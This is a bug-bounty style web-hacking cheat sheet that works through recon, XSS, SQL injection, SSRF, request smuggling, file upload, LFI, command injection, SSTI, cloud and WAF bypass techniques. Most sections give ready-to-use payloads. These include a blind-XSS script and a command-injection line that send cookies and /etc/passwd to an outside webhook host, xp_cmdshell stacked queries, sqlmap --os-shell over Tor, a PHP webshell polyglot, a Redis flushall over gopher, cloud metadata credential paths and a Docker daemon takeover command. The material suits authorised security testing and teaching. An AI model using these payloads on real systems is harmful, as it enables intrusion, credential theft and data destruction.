🔍 Advanced Recon – The Complete Information Warfare

1. Subdomain Intelligence

Go beyond subfinder. Use ASN mapping, reverse IP, CIDR expansion, cloud asset discovery, TLS certificate scraping (crt.sh, chaos, passive DNS), DNS bruteforce with permutation attacks, and recursive enumeration.

# ASN mapping with amass
amass intel -asn 12345
# Permutation attacks with alterx
subfinder -d target.com | alterx -enrich | dnsx -silent

2. JS Recon & Sourcemap Extraction

Extract hidden APIs, webpack chunks, React/Vue/Angular routes, GraphQL endpoints, Firebase configs, and environment variables from JavaScript files. Source maps often expose original source code.

curl -s https://target.com/static/app.js.map | jq .sources
katana -u https://target.com -silent | grep '\.js$' | sort -u | while read url; do
  curl -s "$url" | grep -oP 'https?://[^"]+/api/[^"]+'
done

3. Historical Recon

Use the Wayback Machine, gau, waymore, and archived JS to find deleted endpoints, old admin panels, and forgotten APIs.

gau example.com | sort -u > historical_urls.txt
waymore -i target.com -mode U

4. Infrastructure Mapping

Identify CDN, WAF, server type, cloud provider, and Kubernetes footprint. Use tools like httpx -tech-detect, whatweb, wafw00f.

httpx -l subs.txt -tech-detect -json -o tech.json
wafw00f https://target.com

🧩 Modern Frontend Security – React, Next.js, Vue, Angular

1. React & Next.js Attack Surface

React’s JSX escapes by default, but dangerouslySetInnerHTML, server‑side rendering (hydration attacks), and React Native WebView can introduce XSS. Next.js API routes are often unprotected.

# Example of a Next.js API route without auth
GET /api/nextjs/user?id=123   # may return PII

2. DOM Clobbering & Prototype Pollution

DOM clobbering can overwrite global JavaScript objects via HTML elements. Prototype pollution in client‑side libraries (lodash, jQuery) can lead to XSS or property manipulation.

<form name="__proto__"><input name="isAdmin" value="true"></form>
// If merged without sanitization, may pollute Object.prototype.isAdmin

3. CSP Bypasses & Trusted Types

Content Security Policy can be bypassed via JSONP endpoints, AngularJS sandbox escapes, or Trusted Types misconfigurations. Always test with CSP Evaluator.

# Bypass via JSONP
<script src="https://trusted.com/jsonp?callback=alert(1)"></script>

4. Service Worker & Browser Storage Abuse

Malicious service workers can intercept all requests, steal tokens from localStorage, and phish credentials. IndexedDB can store sensitive data in plaintext.

💉 XSS Masterclass – From Alert(1) to Account Takeover

1. Types & Modern Payloads

Reflected, stored, DOM‑based, blind, self‑XSS, mutation XSS, and UXSS. Use polyglots that work in multiple contexts, SVG payloads, and Unicode bypasses.

<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>

2. CSP & DOMPurify Bypasses

CSP can be evaded with base-uri misconfig, JSONP endpoints, or script-src allowlisting. DOMPurify bypasses exist via mutation XSS or namespace confusion.

3. Blind XSS & Cookie Theft

Set up a webhook to capture cookies, JWTs, and admin sessions. Blind XSS in admin panels is one of the highest‑impact bugs.

<script>new Image().src='https://webhook.site/COL?c='+document.cookie</script>

4. Browser Pivoting & WebSocket Hijacking

Use the XSS to hijack WebSocket connections, force actions on behalf of the victim, or pivot to internal services.

🗄️ SQL Injection Masterclass – The Database Underworld

1. Union‑Based, Boolean‑Based, and Time‑Based

Identify the injection type, number of columns, and extract data using UNION SELECT, conditional errors, or sleep commands.

' UNION SELECT null, username, password FROM users--
' AND 1=IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100,SLEEP(5),0)--

2. Second‑Order SQLi & NoSQL Injection

Second‑order injection occurs when data stored in one request is used unsafely in another. NoSQL injection can bypass authentication in MongoDB, CouchDB, or Firestore.

# MongoDB login bypass
{"username":{"$gt":""},"password":{"$gt":""}}

3. ORM Abuse & Stacked Queries

ORMs like Sequelize or Hibernate can be tricked into exposing data via findAll with malicious parameters. Stacked queries allow executing multiple statements (if DB supports it).

# MSSQL stacked query
'; EXEC xp_cmdshell('whoami');--

4. SQLMap Advanced Workflows

Use --random-agent, --tamper scripts for WAF bypass, --tor for anonymity, and --os-shell for RCE.

sqlmap -u "https://target.com/user.php?id=1" --tamper=between,randomcase --tor --random-agent --os-shell

🔑 Authentication & Session Attacks – Owning Identity

1. JWT Attacks

Exploit alg=none, kid injection, JWKS poisoning, weak HMAC secrets, and token replay. Use jwt_tool or Burp JWT Editor.

jwt_tool eyJhbG... -X a   # algorithm confusion
jwt_tool -j url -I -pc payload -pv "admin" -S hs256 -p "secret"  # forging

2. OAuth, OpenID, SAML

Redirect URI bypass, scope upgrade, state parameter missing, PKCE not enforced, code interception, SAML assertion signature stripping.

3. Session Fixation, Cookie Poisoning, Remember‑Me Flaws

Force a known session ID, poison cookies for privilege escalation, or exploit "remember me" tokens that are guessable or never expire.

4. MFA Bypass & Password Reset Poisoning

Bypass two‑factor authentication by brute‑forcing OTPs, replaying old codes, or exploiting fallback mechanisms. Poison password reset links with Host header injection.

# Password reset poisoning
POST /forgot-password
Host: target.com
... (the reset link will use the Host header)

X-Forwarded-Host: evil.com

🌐 Advanced SSRF – The Server’s Browser

1. Blind SSRF & DNS Rebinding

Use Burp Collaborator or interactsh to confirm blind SSRF. DNS rebinding bypasses host‑based restrictions by rapidly changing the DNS record between private and attacker IPs.

2. Cloud Metadata Exploitation

AWS (169.254.169.254), GCP, Azure, DigitalOcean metadata endpoints can leak IAM credentials, SSH keys, and more.

http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

3. Internal Service Scanning & Redis/Kubernetes

Scan internal networks (127.0.0.1, 10.x, 172.x) for Redis, Memcached, Docker, and Kubernetes APIs.

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

4. PDF Generators & Webhook SSRF

Abuse PDF generation libraries (wkhtmltopdf, Prince) to make internal requests. Webhooks that fetch user‑supplied URLs are prime SSRF targets.

💼 Business Logic & Race Conditions – The Money Bugs

1. Race Conditions (TOCTOU)

Send concurrent requests to bypass rate limits, apply coupons multiple times, or transfer money before balance checks.

# Python concurrent requests
import threading, requests
def exploit():
    requests.post("https://api.target.com/redeem", json={"code":"PROMO"})
for _ in range(10):
    threading.Thread(target=exploit).start()

2. Payment Bypass, Coupon Abuse, Inventory Manipulation

Negative prices, currency conversion bugs, rounding errors, and transaction replay can drain wallets or overcharge. Coupon reuse and referral abuse are classic logic flaws.

3. Hidden State Transitions & Webhook Forgery

Manipulate order status, skip payment steps, or forge webhook signatures to confirm transactions without paying.

# Replay a webhook event with a fake signature
curl -X POST https://api.target.com/webhook -H "X-Signature: sha256=0000" -d '{"event":"payment_success"}'

🐙 HTTP Request Smuggling & Desync

1. CL.TE, TE.CL, TE.TE

Exploit parsing discrepancies between frontend proxy and backend. Smuggle a hidden request to poison caches or bypass restrictions.

POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: internal

2. HTTP/2 Desync & Browser‑Powered Smuggling

HTTP/2 downgrades to HTTP/1.1 can introduce new smuggling vectors. Tools: Burp HTTP/2 Smuggler, h2cSmuggler.

3. Response Queue Poisoning & Request Tunneling

Poison the response queue to serve malicious content to other users. Tunneling allows bypassing frontend restrictions entirely.

🗄️ Cache Poisoning & Web Cache Deception

1. Host Header Poisoning

Inject malicious Host or X-Forwarded-Host headers to poison cached pages, redirecting users to attacker‑controlled domains.

GET / HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

2. Web Cache Deception

Trick the CDN into caching sensitive user data by appending fake static extensions (e.g., /profile.css).

GET /account.jsp.css HTTP/1.1
Host: target.com

3. Cache Key Confusion & Normalized Path Abuse

Exploit CDN behavior (CloudFront, Fastly, Akamai) to serve different content under the same cache key.

📎 File Upload Exploitation – From Webshell to RCE

1. MIME Confusion & Polyglot Files

Create files that are valid in multiple formats (e.g., GIF+PHP). Bypass client‑side validation with Burp Suite.

GIF89a;
<?php system($_GET['cmd']); ?>

2. Extension & Null‑Byte Bypass

Use double extensions (file.php.jpg), null bytes (file.php%00.jpg), or case variations (file.PHp).

3. ZIP Slip, SVG XSS, ImageTragick

Path traversal in ZIP uploads can overwrite system files. SVG files can contain JavaScript. ImageMagick exploits (e.g., CVE‑2016‑3714) lead to RCE.

📂 Advanced LFI/RFI – Reading the Server’s Diary

1. PHP Wrappers & Filter Chains

Use php://filter/convert.base64-encode/resource=index.php to read source code, or chain filters to achieve RCE.

php://filter/convert.iconv.utf-8.utf-16/resource=index.php

2. Log Poisoning & Session Poisoning

Inject PHP code into server logs (access.log) or session files, then include them to get RCE.

# Inject into User-Agent
User-Agent: <?php system('id'); ?>
# Then include /var/log/apache2/access.log

3. RFI Chains & Container Escapes

If RFI is possible, host a malicious PHP file and include it remotely. In Docker, /proc/1/cwd/ may grant container access.

⚙️ Command Injection – Shell from Input

1. Blind & OOB Exfiltration

Use curl, wget, or nslookup to exfiltrate command output via DNS or HTTP. Shell metacharacters (; | & $() \` \`) are your friends.

; wget https://webhook.site/CMD?data=`cat /etc/passwd|base64`

2. Windows Command Injection

Use &, &&, ||, and PowerShell to execute commands. Example: & whoami.

3. Escaping Filters & Encoding Bypasses

Use ${IFS} as a space substitute, cmd=\`echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d\`;eval \$cmd to bypass WAF.

🖨️ Server‑Side Template Injection (SSTI)

1. Jinja2, Twig, Freemarker, Velocity

Template engines evaluate user input. Inject payloads like {{7*7}}, then escalate to RCE.

# Jinja2 RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}

2. Sandbox Escapes

Bypass restrictions by accessing __globals__, __builtins__, or leveraging the os module.

# Smarty RCE
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>")}

🧬 Prototype Pollution – Poisoning the Root Object

1. Client‑Side Pollution

Merge user‑controlled JSON into an object using vulnerable libraries (lodash merge, jQuery $.extend(true, ...)). Polluting Object.prototype can enable XSS or privilege escalation.

{"__proto__":{"isAdmin":true}}

2. Server‑Side Node.js Pollution

If the backend merges user input without sanitization, it can override critical properties, leading to authentication bypass or RCE (via child_process gadgets).

📡 WebSockets & Real‑Time Application Attacks

1. Auth Bypass & Room Hijacking

WebSocket handshake may lack proper authentication. Enumerate rooms or channels and join without credentials.

wscat -c wss://target.com/socket -H "Authorization: Bearer token"

2. Message Tampering & Event Injection

Replay or modify WebSocket messages. Inject custom events to trigger unintended actions on the server or other clients.

☁️ Cloud Attack Surface – S3, Firebase, Kubernetes

1. S3 Bucket Misconfigurations

Publicly writable S3 buckets allow uploading arbitrary files. Test with aws s3 ls s3://bucket-name --no-sign-request.

2. Firebase & Supabase Leaks

Exposed Firebase configs with .json endpoints, weak Firestore rules, and Supabase anon keys.

curl https://project.firebaseio.com/.json

3. Kubernetes & Docker API Exposure

Open kubelet (port 10250) or Docker daemon (port 2375) can grant cluster admin. CI/CD secrets in GitHub Actions, Jenkins.

docker -H tcp://host:2375 run -it alpine sh

🛡️ WAF Bypass – Cloudflare, Akamai, AWS WAF

1. Unicode & Encoding Tricks

Use Unicode normalisation, mixed encodings, double URL encoding, and chunked transfer to evade pattern matching.

%u003cscript%u003ealert(1)%u003c/script%u003e
<scri<script>pt>alert(1)</scri</script>pt>

2. Header Smuggling & Verb Tampering

Use X-Original-URL, X-Rewrite-URL, or HTTP verb overrides to bypass path‑based rules.

3. Parser Differentials

Exploit differences between how the WAF and the backend parse the request (e.g., Content-Type confusion).

🧠 Browser Internals – SOP, CORS, CSP, and More

1. Same‑Origin Policy & CORS

Understand how SOP restricts cross‑origin interactions. Misconfigured CORS (Access-Control-Allow-Origin: *) can leak sensitive data.

2. CORB, CORP, COOP, COEP

Cross‑Origin Read Blocking, Cross‑Origin Resource Policy, and other headers that protect against Spectre‑style attacks.

3. DOM Parsing & HTML Quirks

Parse tree construction, <base> injection, and formaction hijacking are powerful when combined with XSS.

🧨 Payload Engineering – The Science of Breaking Things

1. Polyglots & Parser Confusion

Payloads that work across multiple injection contexts (HTML, JS, CSS, URL).

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

2. WAF‑Bypass Payloads

Craft payloads that evade common WAF rules using encoding, concatenation, and case variations.

3. Browser‑Specific Payloads

Firefox, Chrome, and Safari handle certain features differently. Exploit these quirks for targeted attacks.

🗺️ The Elite Hunter’s Methodology

Recon → Mapping → Input Discovery → Trust Boundaries → Auth Analysis → State Changes → Business Logic → Chaining → Impact Analysis → Reporting

Every phase feeds into the next. Start broad, narrow down, think like an attacker, and always ask “what if?”.

🤖 Automation & Scaling – Hunt at Machine Speed

1. Recon Pipelines

Chain subfinder, dnsx, httpx, katana, and nuclei with anew for continuous monitoring.

subfinder -d target.com | anew subs.txt | dnsx -silent | httpx -silent | katana -silent | anew endpoints.txt | nuclei -t cves/

2. GitHub Actions & CI/CD

Schedule scans with GitHub Actions, send alerts to Telegram/Discord on new findings. Use Docker for reproducible environments.

📖 Real‑World Case Studies

Shopify – Race Condition on Coupon

Concurrent requests allowed multiple uses of a single‑use coupon. Root cause: check and apply not atomic.

Facebook – GraphQL Auth Bypass

Missing resolver‑level authorization allowed deleting any user’s comments. Learned: auth must be checked in every resolver.

Uber – Subdomain Takeover → OAuth Hijack

An unclaimed S3 bucket on a subdomain allowed serving a fake OAuth page, stealing session tokens.

🧠 The Elite Hunter’s Mindset

“What does the backend trust from the frontend?”

Always challenge assumptions. Is the role only checked in the UI? Can I skip steps? What if two requests arrive at the same time? What if the cache stores private data?

📝 Report Writing – Turning Bugs into Bounties

1. Proof of Concept

Provide clear reproduction steps, screenshots, and optionally a video. Use minimal, self‑contained payloads.

2. Impact & CVSS

Explain the real‑world impact. Use CVSS v3.1 to score the vulnerability. Suggest remediation.
